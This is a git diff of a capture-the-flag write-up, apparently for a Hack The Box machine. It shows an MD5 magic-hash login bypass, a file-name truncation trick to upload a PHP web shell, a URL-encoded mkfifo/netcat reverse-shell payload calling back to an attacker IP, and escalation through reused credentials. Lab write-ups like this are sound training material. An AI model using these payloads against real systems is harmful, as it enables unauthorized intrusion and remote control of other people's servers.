@@ -45,25 +45,45 @@ Notice how the password for admin is hashed - it begins with 0e. We can try usin
 
 For this we'll be using MD5 “Magic Number" (from https://www.whitehatsec.com/blog/magic-hashes/) 240610708 as the md5 hash for this string would also start with 0e. As a result this magic hash would collide with other hashes as both are treated as 0 and therefore would compare to be **true**
 
-I successfully logged in by using `240610708` as the password for `admin`
+I successfully logged in by using `240610708` as the password for `admin`.
 
 ![image](https://user-images.githubusercontent.com/88967140/178952959-d8c94975-1d82-4e92-9496-8e8686a450d5.png)
 ![image](https://user-images.githubusercontent.com/88967140/178952977-b66d8f8c-c6f0-405b-a8bd-51cdfb9ff58d.png)
 
-At the start I tried to upload a .php file to see if we can get an easy php reverse shell.
+At the start I tried to upload a .php file to see if we can get an easy PHPreverse shell.
 ![image](https://user-images.githubusercontent.com/88967140/178953133-25763a14-7af2-4356-96e9-3f48070d1dde.png)
-From this image we can clearly see .php files won't work
+From this image we can clearly see .php files won't work.
 
 **File Name Truncation**
+
 What I did was create a file with 251 characters using `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 251`, add .png at the end of the file and upload it. 
 
 ![image](https://user-images.githubusercontent.com/88967140/178954298-a5a63f19-d81b-425c-8482-bba311b7e6a6.png)
 
-Interestingly enough the output mentioned the file name being too long and shortening it, which turned out to be from 255 characters to 236
+Interestingly enough the output mentioned the file name being too long and shortening it, which turned out to be from 255 characters to 236.
 ![image](https://user-images.githubusercontent.com/88967140/178954663-adad24d9-8614-4fe3-96a5-111256cfe655.png)
+
+**PHP REVERSE SHELL**
 
 So now my idea was to make it so that the .png part gets cut off by the upload system and we're left off with <file>.php from which we can execute PHP code.
 I used `vi` to insert this arbitrary PHP execution code in the file we're going to upload next:
+ 
  `<?php echo system($_REQUEST['leo']) ?>`
-and set up `nc -lvnp 12345` on our other terminal
+and set up `nc -lvnp 443` on our other terminal.
+ 
+So now we send a request with `leo=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.3+443+>/tmp/f` to `http://10.10.10.73/uploads/<folder from CMD output>/<file name>.php` as the payload.
+* Important to URL encode it - otherwise the payload won't work.
 
+ And finally I got the shell.
+ ![image](https://user-images.githubusercontent.com/88967140/178956561-cdabbc78-1a05-4a42-8880-6d899fa95fa5.png)
+ 
+ **Privilege Escalation**
+ **www-data -> moshe (Password reuse)**
+
+ Web directory enumeration showed this interesting .php file `connection.php`, which, as it turns out, included credentials for `moshe` user.
+ ![image](https://user-images.githubusercontent.com/88967140/178957004-fd97e9a1-62c9-46d6-bb75-482d5e5dcf0d.png)
+ 
+ Reusing those credentials, I was able to SSH in as `moshe` and read user.txt.
+ ![image](https://user-images.githubusercontent.com/88967140/178957521-383fa639-74d0-4138-9f0c-169c2dfe3b37.png)
+
+ 
